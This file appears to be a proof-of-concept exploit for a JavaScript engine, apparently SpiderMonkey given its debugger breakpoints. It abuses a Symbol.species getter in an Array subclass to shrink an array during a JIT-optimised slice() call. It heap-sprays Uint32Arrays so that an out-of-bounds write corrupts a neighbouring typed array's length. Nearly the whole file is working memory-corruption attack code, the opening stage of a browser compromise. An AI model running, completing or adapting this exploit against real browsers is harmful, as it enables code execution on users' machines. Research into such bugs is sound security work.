/*

bp js!js::math_atan; 
bp js!js::math_atan2;

*/

let Trigger = false;
let corruptorArray = null;
let a = null;
let arrHolder = [];
let Spray = [];
const ArraySize = 0x4;

function gc(){
	for(let i = 0; i < 0x40000; i++) 
	{
		Spray.push(new Uint32Array(ArraySize));
	}
}

function Target(Special, Idx, Value) {
    corruptorArray[Idx] = 0x41414141;
	
	//putting anything in between will not eliminate the second bounds check..
	//during special.slice when size is set to 0, the array moves space
    Special.slice();
	
	
    corruptorArray[Idx] = Value;

}

function reclaimSpace(){
	//b = new Uint32Array();
	//Math.atan2(b);
	for (var i = 0; i < 0x4000; i++){
		a = new Uint32Array(0x8);
		//a = [1.1, 1.2, 1.3];
		arrHolder.push(a);
	}
}


class SoSpecial extends Array {
    static get [Symbol.species]() {
        return function() {
            if(!Trigger) {
				//not triggered usually
                return;
            }
			//when length is set to 0, the object is reallocated into a smaller memory area
            corruptorArray.length = 0;
            gc();
        };
    }
};

function main() {
	gc();
	const Snowflake = new SoSpecial();
	
	for (let i = 0; i < 10; i++)
	{
		corruptorArray = new Array(0x7e);
		reclaimSpace();
		corruptorArray.fill(0x41);
		reclaimSpace();
		Trigger = false;
		for(let Idx = 0; Idx < 0x400; Idx++) {
			//added this line to set longer than 8 byte and make it a float
			//value = 0x4242424242 + Idx;
			value = Idx;
			Target(Snowflake, 0x70, value);
		}
		Trigger = true;
	
		//set corruptorArray length to 0
		//out of bounds write corruptorArray[0x20] is written?
		Target(Snowflake, 11, 0x4242); //Point this to length
		for (var z = 0; z < arrHolder.length; z++){
			//console.log(arrHolder[z].length);
			if (arrHolder[z].length != 8){
				corruptedArray = arrHolder[z];
				//console.log(arrHolder[z].length);
				console.log("Found corrupted?");
				return;
			}
		}
		console.log("out");
	}
}

main();

console.log("Corrupted Array length: ", corruptedArray.length);